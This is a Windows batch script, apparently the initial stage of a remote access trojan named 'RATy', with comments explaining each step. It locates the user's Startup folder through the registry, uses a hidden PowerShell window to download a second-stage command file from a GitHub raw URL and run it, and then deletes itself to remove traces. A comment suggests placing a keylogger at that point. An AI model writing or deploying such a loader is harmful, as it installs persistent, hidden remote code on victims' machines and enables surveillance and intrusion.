@ REM -@echo off-           if i uncomment it, then the commands below wont show up printed on the cmd after running the -initial.cmd- file in cmd.  Its better to keep commented in Testing/Debugging Mode and uncomment it in Prod Mode
@REM Initial Stage for RATy
@REM Created By : Muhammad Mohid Mughal

@REM variables
set "INITIALPATH=%cd%"    & @REM stores the initial path (in the variable) in which the user keeps the initially downloaded file, can be -Download- or -WP- or any other Folder
set "STARTUP="

@REM Dynamically retrieving Startup folder path from the windows registry (we are retrieving from win registry as the user may had change the name of the StartUp Folder on his PC, So harcoding anything wont work)
for /f "tokens=2,*" %%A in ('reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v Startup 2^>nul') do set "STARTUP=%%B"
if not defined STARTUP (
    echo ERROR: Could not retrieve Startup folder path.
    exit /b
)

@REM Move into Start Up Directory - /d will make sure that the directory changes even if we have to change the DRIVE for the path we get. E.g: If we need to move from D:\  to  C:\
cd /d "%STARTUP%"  & @REM  To change directory to the StartUp folder in order to create the desired file into that directory

@REM Write Payloads to that Startup / Create the desired file in that Startup Folder
@REM  We can place a keylogger here
powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -URI 'raw.githubusercontent.com/mohid-mughal/RATy/refs/heads/main/files/wget.cmd' -OutFile 'wget.cmd' "


@REM Automaticaly Runs the desired file / payload, The output of the payload after runing it will show in the same StartUp Folder
powershell Start-Process powershell.exe -windowstyle hidden .\wget.cmd

pause

@REM Move back to the initial Location from where we started -Download- or -WP- Folder, We Move back there as we want to remove the initial file in that directory so that all the traces are removed.
cd "%INITIALPATH%"
del initial.cmd








